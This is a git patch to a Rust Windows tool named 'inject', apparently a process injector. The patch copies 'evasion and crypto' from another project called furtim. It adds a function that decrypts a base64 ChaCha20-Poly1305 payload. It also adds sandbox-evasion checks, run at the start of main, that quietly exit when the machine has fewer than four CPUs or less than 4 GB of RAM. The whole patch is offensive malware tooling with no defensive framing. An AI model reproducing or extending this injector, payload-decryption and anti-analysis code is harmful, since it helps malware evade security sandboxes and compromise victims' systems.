@@ -1,0 +1,113 @@
+From 1d7f26c62a8e8d36a9aab4548d617c72055fdfe2 Mon Sep 17 00:00:00 2001
+From: Ron Panduwana <panduwana@gmail.com>
+Date: Mon, 19 Oct 2026 13:32:49 +0700
+Subject: [PATCH 01/10] copy furtim's evasion and crypto
+
+---
+ inject/Cargo.toml     |  8 ++++++--
+ inject/src/crypto.rs  | 14 ++++++++++++++
+ inject/src/evasion.rs | 21 +++++++++++++++++++++
+ inject/src/main.rs    |  7 ++++++-
+ 4 files changed, 47 insertions(+), 3 deletions(-)
+ create mode 100644 inject/src/crypto.rs
+ create mode 100644 inject/src/evasion.rs
+
+diff --git a/inject/Cargo.toml b/inject/Cargo.toml
+index 2d94236..9bd0183 100644
+--- a/inject/Cargo.toml
++++ b/inject/Cargo.toml
+@@ -9,9 +9,13 @@ edition = "2021"
+ #log = "0.4.17"
+ #env_logger = "0.10.0"
+ clap = {version = "4.3.0", features = ["derive"] }
++num_cpus = "1.15"
++sysinfo = "0.29"
++chacha20poly1305 = "0.10.1"
++base64 = "0.22.1"
+ 
+ [dependencies.windows-sys]
+-version = "0.48.0"
++version = "0.52.0"
+ features = [
+     "Win32_Foundation",
+     "Win32_Security",
+@@ -35,4 +39,4 @@ features = [
+     "Win32_System_IO",
+     "Win32_Networking_ActiveDirectory",
+     "Win32_Security_Authentication_Identity"
+-]
+\ No newline at end of file
++]
+diff --git a/inject/src/crypto.rs b/inject/src/crypto.rs
+new file mode 100644
+index 0000000..df57b58
+--- /dev/null
++++ b/inject/src/crypto.rs
+@@ -0,0 +1,14 @@
++use chacha20poly1305::{Aead, ChaCha20Poly1305, Key, KeyInit, Nonce};
++use base64::engine::{Engine as _, general_purpose::STANDARD};
++
++pub fn decrypt_payload(ciphertext_base64: &str, key_bytes: &[u8; 32], nonce_bytes: &[u8; 12]) -> Result<Vec<u8>, String> {
++    let ciphertext_vec = STANDARD.decode(ciphertext_base64)
++        .map_err(|e| format!("Base64 decode error: {}", e))?;
++    
++    let key = Key::from_slice(key_bytes);
++    let nonce = Nonce::from_slice(nonce_bytes);
++    let cipher = ChaCha20Poly1305::new(key);
++    
++    cipher.decrypt(nonce, ciphertext_vec.as_ref())
++        .map_err(|e| format!("Decryption error: {}", e))
++}
+diff --git a/inject/src/evasion.rs b/inject/src/evasion.rs
+new file mode 100644
+index 0000000..0355980
+--- /dev/null
++++ b/inject/src/evasion.rs
+@@ -0,0 +1,21 @@
++use sysinfo::{System, SystemExt};
++
++const MIN_CPUS: usize = 4;
++const MIN_RAM_BYTES: u64 = 4 * 1024 * 1024 * 1024; // 4 GB
++
++pub fn run_evasion_checks() -> bool {
++    // 1. CPU Core Check
++    let available_cpus = num_cpus::get();
++    if available_cpus < MIN_CPUS {
++        return false;
++    }
++    // 2. RAM Check
++    let mut sys = System::new_all();
++    sys.refresh_memory();
++    let total_memory = sys.total_memory();
++
++    if total_memory < MIN_RAM_BYTES {
++        return false;
++    }
++    true
++}
+diff --git a/inject/src/main.rs b/inject/src/main.rs
+index 7997f52..b7d7f0d 100644
+--- a/inject/src/main.rs
++++ b/inject/src/main.rs
+@@ -1,5 +1,6 @@
+-use std::{ptr::null_mut, mem::size_of};
++use std::{ptr::null_mut, mem::size_of, process};
+ use clap::Parser;
++mod evasion;
+ use windows_sys::Win32::{
+     Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
+     System::{
+@@ -23,6 +24,10 @@ struct Args {
+ }
+ 
+ fn main() {
++    if !evasion::run_evasion_checks() {
++        process::exit(0);
++    }
++
+     let args = Args::parse();
+ 
+     let process_name = &args.process;
+-- 
+2.39.5 (Apple Git-154)
+
